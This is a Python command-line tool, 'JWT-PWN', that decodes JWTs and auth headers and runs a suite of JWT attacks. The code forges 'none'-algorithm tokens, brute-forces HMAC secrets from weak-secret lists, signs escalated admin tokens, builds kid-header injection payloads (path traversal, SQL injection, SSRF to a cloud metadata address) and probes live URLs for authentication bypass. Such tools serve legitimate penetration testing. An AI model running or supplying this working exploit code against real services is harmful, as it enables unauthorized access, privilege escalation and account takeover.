#!/usr/bin/env python3
"""
JWT-PWN: Auth Header Analyzer + JWT Attack Suite
A comprehensive tool for API security testing
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.request
import urllib.error
from typing import Optional

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"
BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"

BANNER = f"""
{C}{BOLD}
   ██╗██╗    ██╗████████╗      ██████╗ ██╗    ██╗███╗   ██╗
   ██║██║    ██║╚══██╔══╝     ██╔══██╗██║    ██║████╗  ██║
   ██║██║ █╗ ██║   ██║        ██████╔╝██║ █╗ ██║██╔██╗ ██║
██╗██║██║███╗██║   ██║        ██╔═══╝ ██║███╗██║██║╚██╗██║
╚████╔╝╚███╔███╔╝  ██║        ██║     ╚███╔███╔╝██║ ╚████║
 ╚═══╝  ╚══╝╚══╝   ╚═╝        ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
{RESET}{DIM}  Auth Header Analyzer + JWT Attack Suite  v1.0.0{RESET}
"""

COMMON_WEAK_SECRETS = [
    "secret","password","123456","qwerty","jwt","token","key","mysecret",
    "changeme","default","admin","test","supersecret","yoursecret","secretkey",
    "jwtkey","jwt_secret","your-256-bit-secret","your-secret-key","secret123",
    "password123","HS256","HS512","none","","null","undefined","flask-unsign",
    "development","production","staging","access_secret","refresh_secret",
]

def b64url_decode(s):
    s = s.replace('-','+').replace('_','/')
    padding = 4 - len(s) % 4
    if padding != 4: s += '=' * padding
    return base64.b64decode(s)

def b64url_encode(b):
    return base64.b64encode(b).decode().replace('+','-').replace('/','_').rstrip('=')

def safe_json(data):
    try: return json.loads(data.decode('utf-8', errors='replace'))
    except: return {}

def parse_jwt(token):
    token = token.strip()
    parts = token.split('.')
    if len(parts) != 3: return None
    try:
        header = safe_json(b64url_decode(parts[0]))
        payload = safe_json(b64url_decode(parts[1]))
        return header, payload, parts[2], parts
    except: return None

def build_jwt(header, payload, secret="", algorithm=None):
    if algorithm: header['alg'] = algorithm
    h = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{h}.{p}".encode()
    alg = header.get('alg','none').upper()
    if alg in ('NONE','') or not secret:
        return f"{h}.{p}."
    hash_func = hashlib.sha256 if alg=='HS256' else hashlib.sha384 if alg=='HS384' else hashlib.sha512
    sig = hmac.new(secret.encode(), signing_input, hash_func).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

def _alg_badge(alg):
    a = alg.upper()
    if a == 'NONE': return f"{R}{BOLD}none ← CRITICAL: no signature!{RESET}"
    elif a.startswith('HS'): return f"{Y}{alg} ← symmetric, brute-forceable{RESET}"
    elif a.startswith('RS'): return f"{G}{alg} ← asymmetric RSA{RESET}"
    elif a.startswith('ES'): return f"{G}{alg} ← elliptic curve{RESET}"
    else: return f"{R}{alg} ← UNKNOWN/SUSPICIOUS{RESET}"

def _claim_label(key, value):
    now = int(time.time())
    if key == 'exp' and isinstance(value, int):
        remaining = value - now
        if remaining < 0: return f"{R}{DIM}← EXPIRED {abs(remaining)//60}m ago{RESET}"
        elif remaining < 300: return f"{Y}{DIM}← expires in {remaining}s{RESET}"
        else: return f"{G}{DIM}← valid for {remaining//3600}h{RESET}"
    elif key == 'iat' and isinstance(value, int):
        return f"{DIM}← issued {(now-value)//3600}h ago{RESET}"
    elif key in ('role','roles','group','admin','is_admin','privilege'):
        return f"{Y}{DIM}← privilege claim — escalation target{RESET}"
    elif key in ('sub','user_id','uid','id','userId'):
        return f"{DIM}← identity claim — IDOR target{RESET}"
    return ""

def _print_jwt_analysis(header, payload, sig):
    alg = header.get('alg','MISSING')
    print(f"  {BOLD}{B}┌─ JWT STRUCTURE ─────────────────────────────────{RESET}")
    print(f"  {B}│{RESET} Algorithm : {_alg_badge(alg)}")
    print(f"  {B}│{RESET} Type      : {header.get('typ','JWT')}")
    if 'kid' in header:
        print(f"  {B}│{RESET} Kid       : {R}{header['kid']}{RESET}  {DIM}← injection target{RESET}")
    if 'jku' in header:
        print(f"  {B}│{RESET} jku       : {R}{header['jku']}{RESET}  {DIM}← JWKS URL spoofing possible{RESET}")
    if 'x5u' in header:
        print(f"  {B}│{RESET} x5u       : {R}{header['x5u']}{RESET}  {DIM}← cert URL injection possible{RESET}")
    print(f"  {B}│{RESET}")
    print(f"  {B}│{RESET} {BOLD}PAYLOAD CLAIMS{RESET}")
    for k, v in payload.items():
        label = _claim_label(k, v)
        print(f"  {B}│{RESET}   {C}{k}{RESET}: {W}{v}{RESET}  {label}")
    print(f"  {B}└{'─'*50}{RESET}")

def analyze_jwt(token):
    print(f"\n{BOLD}{C}━━━ JWT ANALYSIS ━━━{RESET}\n")
    parsed = parse_jwt(token)
    if not parsed:
        print(f"  {R}[✗] Invalid JWT format{RESET}"); return
    _print_jwt_analysis(parsed[0], parsed[1], parsed[2])

def detect_auth_type(headers):
    findings = []
    auth = headers.get('authorization', headers.get('Authorization',''))
    if auth.lower().startswith('bearer '):
        token = auth[7:]
        if token.count('.') == 2: findings.append(('JWT Bearer Token','HIGH',token))
        else: findings.append(('Opaque Bearer Token','MEDIUM',token))
    elif auth.lower().startswith('basic '):
        try:
            decoded = base64.b64decode(auth[6:]).decode()
            findings.append(('HTTP Basic Auth','CRITICAL',f"Credentials: {decoded}"))
        except: findings.append(('HTTP Basic Auth','CRITICAL','(decode failed)'))
    elif auth.lower().startswith('digest '): findings.append(('HTTP Digest Auth','MEDIUM',auth[7:]))
    elif auth: findings.append(('Unknown Auth Scheme','INFO',auth))
    for h, v in headers.items():
        hl = h.lower()
        if hl in ('x-api-key','x-auth-token','x-access-token','api-key','x-token','x-secret'):
            findings.append((f'API Key Header [{h}]','MEDIUM',v))
        if hl == 'cookie':
            for c in v.split(';'):
                c = c.strip()
                if any(k in c.lower() for k in ['jwt','token','session','auth','access']):
                    findings.append(('Auth Cookie','MEDIUM',c))
    return findings

def analyze_auth_headers(raw_headers):
    print(f"\n{BOLD}{C}━━━ AUTH HEADER ANALYSIS ━━━{RESET}\n")
    headers = {}
    for line in raw_headers.strip().splitlines():
        if ':' in line:
            k, _, v = line.partition(':')
            headers[k.strip()] = v.strip()
    findings = detect_auth_type(headers)
    if not findings:
        print(f"  {Y}[!] No authentication headers detected{RESET}"); return
    for name, severity, value in findings:
        color = R if severity in ('CRITICAL','HIGH') else Y if severity=='MEDIUM' else C
        print(f"  {color}[{severity}]{RESET} {BOLD}{name}{RESET}")
        display = value[:80]+'...' if len(value)>80 else value
        print(f"         {DIM}{display}{RESET}")
        if value.count('.') == 2 and severity in ('HIGH','CRITICAL'):
            parsed = parse_jwt(value)
            if parsed:
                print()
                _print_jwt_analysis(parsed[0], parsed[1], parsed[2])

def attack_none_alg(token):
    parsed = parse_jwt(token)
    if not parsed: return {}
    header, payload, _, _ = parsed
    results = {}
    for variant in ['none','None','NONE','nOnE','noNe','NonE']:
        h = dict(header); h['alg'] = variant
        results[variant] = build_jwt(h, payload, "", variant)
    return results

def attack_weak_secret(token, extra_wordlist=None):
    parsed = parse_jwt(token)
    if not parsed: return None
    header, payload, sig, parts = parsed
    alg = header.get('alg','').upper()
    if not alg.startswith('HS'):
        print(f"  {Y}[!] Token uses {alg}, not HMAC — skipping brute force{RESET}"); return None
    wordlist = COMMON_WEAK_SECRETS + (extra_wordlist or [])
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    hash_func = hashlib.sha256 if alg=='HS256' else hashlib.sha384 if alg=='HS384' else hashlib.sha512
    for secret in wordlist:
        computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
        try:
            expected = b64url_decode(parts[2])
            if hmac.compare_digest(computed, expected): return secret
        except: continue
    return None

def _is_expired(payload):
    exp = payload.get('exp')
    return isinstance(exp, int) and exp < int(time.time())

def _has_priv_claims(payload):
    return any(k in payload for k in ('role','roles','is_admin','admin','privilege'))

def run_all_attacks(token, wordlist_file=None, target_url=None):
    print(f"\n{BOLD}{C}━━━ JWT ATTACK SUITE ━━━{RESET}\n")
    parsed = parse_jwt(token)
    if not parsed:
        print(f"  {R}[✗] Invalid JWT{RESET}"); return
    header, payload, sig, parts = parsed

    # Attack 1: none alg
    print(f"  {BOLD}[1/5] Algorithm Confusion → none{RESET}")
    none_results = attack_none_alg(token)
    for variant, forged in none_results.items():
        print(f"      {G}alg={variant:<6}{RESET}  {DIM}{forged[:90]}...{RESET}")
    print(f"      {Y}↑ Try all variants — some parsers only accept specific casing{RESET}\n")

    # Attack 2: weak secret
    extra = []
    if wordlist_file:
        try:
            with open(wordlist_file) as f: extra = [l.strip() for l in f if l.strip()]
        except FileNotFoundError: print(f"  {Y}[!] Wordlist not found, using built-ins{RESET}")
    total = len(COMMON_WEAK_SECRETS) + len(extra)
    print(f"  {BOLD}[2/5] HMAC Brute Force{RESET}  ({total} candidates)")
    cracked = attack_weak_secret(token, extra)
    if cracked is not None:
        print(f"      {R}{BOLD}[!!!] SECRET CRACKED: \"{cracked}\"{RESET}")
        priv_payload = dict(payload)
        for k in ('role','roles','is_admin','admin','privilege'):
            if k in priv_payload:
                priv_payload[k] = 'admin' if isinstance(priv_payload[k],str) else True
        priv_payload['is_admin'] = True; priv_payload['role'] = 'admin'
        signed = build_jwt(dict(header), priv_payload, cracked)
        print(f"      {Y}Signed escalated token:{RESET}")
        print(f"      {DIM}{signed}{RESET}")
    else:
        print(f"      {G}[✓] No weak secret found{RESET}")
    print()

    # Attack 3: privilege escalation
    print(f"  {BOLD}[3/5] Privilege Escalation Payloads{RESET}")
    for changes in [{'role':'admin'},{'is_admin':True},{'admin':True},{'privilege':'admin'},{'roles':['admin']}]:
        h2 = dict(header); p2 = dict(payload); p2.update(changes)
        forged = build_jwt(h2, p2)
        k,v = list(changes.items())[0]
        print(f"      {Y}{k}={v:<15}{RESET}  {DIM}{forged[:80]}...{RESET}")
    print(f"      {DIM}↑ Unsigned — combine with none-alg bypass or cracked secret{RESET}\n")

    # Attack 4: kid injection
    print(f"  {BOLD}[4/5] KID Header Injection{RESET}")
    if 'kid' in header:
        print(f"      {Y}[!] kid found: {header['kid']}{RESET}")
        for label, injection in [
            ("Path Traversal", "../../dev/null"),
            ("SQL Injection",  "' UNION SELECT 'pwned'--"),
            ("Empty",         ""),
            ("SSRF",          "http://169.254.169.254/"),
        ]:
            h2 = dict(header); h2['kid'] = injection
            forged = build_jwt(h2, payload, "", header.get('alg','HS256'))
            print(f"      {R}{label:<18}{RESET}  {DIM}{forged[:70]}...{RESET}")
    else:
        print(f"      {G}[✓] No kid header present{RESET}")
    print()

    # Attack 5: header injection (jku/x5u/jwks)
    print(f"  {BOLD}[5/5] JWKS URL Injection (jku/x5u){RESET}")
    if 'jku' in header:
        print(f"      {R}[!] jku header present: {header['jku']}{RESET}")
        print(f"      {Y}→ Host a rogue JWKS at a controlled URL, set jku to point to it{RESET}")
    elif 'x5u' in header:
        print(f"      {R}[!] x5u header present: {header['x5u']}{RESET}")
    else:
        print(f"      {G}[✓] No jku/x5u headers — not directly vulnerable{RESET}")
        print(f"      {DIM}(still worth testing if server fetches JWKS from alg header){RESET}")
    print()

    # Summary
    print(f"  {BOLD}{C}━━━ FINDINGS SUMMARY ━━━{RESET}")
    alg = header.get('alg','MISSING').upper()
    checks = [
        ("Algorithm is 'none'",      alg=='NONE',                      R),
        ("Symmetric HMAC (HS*)",     alg.startswith('HS'),             Y),
        ("Secret was cracked",       cracked is not None,              R),
        ("KID header present",       'kid' in header,                  Y),
        ("JKU/X5U header present",   'jku' in header or 'x5u' in header, Y),
        ("Token expired",            _is_expired(payload),             Y),
        ("Privilege claims present", _has_priv_claims(payload),        Y),
    ]
    for label, condition, bad_color in checks:
        icon = "⚠" if condition else "✓"
        color = bad_color if condition else G
        print(f"  {color}[{icon}] {label}{RESET}")
    print()

def _status_badge(code):
    if code == 200: return f"{G}{BOLD}{code}{RESET}"
    elif code in (401,403): return f"{R}{code}{RESET}"
    elif code == 0: return f"{Y}ERR{RESET}"
    else: return f"{Y}{code}{RESET}"

def probe_url(url, token):
    print(f"\n{BOLD}{C}━━━ LIVE PROBE ━━━{RESET}")
    print(f"  Target: {url}\n")
    def req(t):
        r = urllib.request.Request(url)
        r.add_header('Authorization', f'Bearer {t}')
        try:
            with urllib.request.urlopen(r, timeout=10) as res:
                return res.status, len(res.read())
        except urllib.error.HTTPError as e: return e.code, 0
        except: return 0, 0
    code, size = req(token)
    print(f"  Original token    : HTTP {_status_badge(code)} ({size}b)")
    for variant, forged in attack_none_alg(token).items():
        code2, size2 = req(forged)
        bypass = f"  {R}{BOLD}← BYPASS!{RESET}" if code2==200 and code!=200 else ""
        print(f"  none({variant:<6})      : HTTP {_status_badge(code2)} ({size2}b){bypass}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='JWT-PWN: Auth Header Analyzer + JWT Attack Suite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_pwn.py analyze -t "eyJhbGc..."
  python jwt_pwn.py attack  -t "eyJhbGc..." -w rockyou.txt
  python jwt_pwn.py attack  -t "eyJhbGc..." -u https://api.target.com/me
  python jwt_pwn.py headers -H "Authorization: Bearer eyJ..."
  python jwt_pwn.py forge   -t "eyJhbGc..." -s "secret" --set role=admin
  cat request.txt | python jwt_pwn.py headers
        """)
    sub = parser.add_subparsers(dest='command')

    p = sub.add_parser('analyze', help='Decode and analyze a JWT')
    p.add_argument('-t','--token', required=True)

    p = sub.add_parser('attack', help='Run all JWT attacks')
    p.add_argument('-t','--token', required=True)
    p.add_argument('-w','--wordlist', help='Custom wordlist for brute force')
    p.add_argument('-u','--url', help='URL to probe with forged tokens')

    p = sub.add_parser('headers', help='Analyze HTTP auth headers')
    p.add_argument('-H','--headers', nargs='+')
    p.add_argument('-f','--file')

    p = sub.add_parser('forge', help='Forge a modified JWT')
    p.add_argument('-t','--token', required=True)
    p.add_argument('-s','--secret', default='')
    p.add_argument('--set', nargs='+', metavar='KEY=VALUE')
    p.add_argument('--alg')

    args = parser.parse_args()

    if args.command == 'analyze':
        analyze_jwt(args.token)
    elif args.command == 'attack':
        analyze_jwt(args.token)
        run_all_attacks(args.token, args.wordlist)
        if args.url: probe_url(args.url, args.token)
    elif args.command == 'headers':
        if args.headers: raw = "\n".join(args.headers)
        elif args.file:
            with open(args.file) as f: raw = f.read()
        elif not sys.stdin.isatty(): raw = sys.stdin.read()
        else: print("Paste HTTP headers (Ctrl+D when done):"); raw = sys.stdin.read()
        analyze_auth_headers(raw)
    elif args.command == 'forge':
        parsed = parse_jwt(args.token)
        if not parsed: print(f"{R}[✗] Invalid JWT{RESET}"); sys.exit(1)
        header, payload, _, _ = parsed
        new_payload = dict(payload)
        if args.set:
            for kv in args.set:
                if '=' not in kv: continue
                k, v = kv.split('=',1)
                if v.lower()=='true': v=True
                elif v.lower()=='false': v=False
                elif v.isdigit(): v=int(v)
                new_payload[k] = v
        new_header = dict(header)
        if args.alg: new_header['alg'] = args.alg
        forged = build_jwt(new_header, new_payload, args.secret)
        print(f"\n{BOLD}{C}━━━ FORGED TOKEN ━━━{RESET}\n")
        print(f"  Header  : {json.dumps(new_header, indent=2)}")
        print(f"  Payload : {json.dumps(new_payload, indent=2)}")
        print(f"\n{G}{BOLD}{forged}{RESET}\n")
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
PYEOF
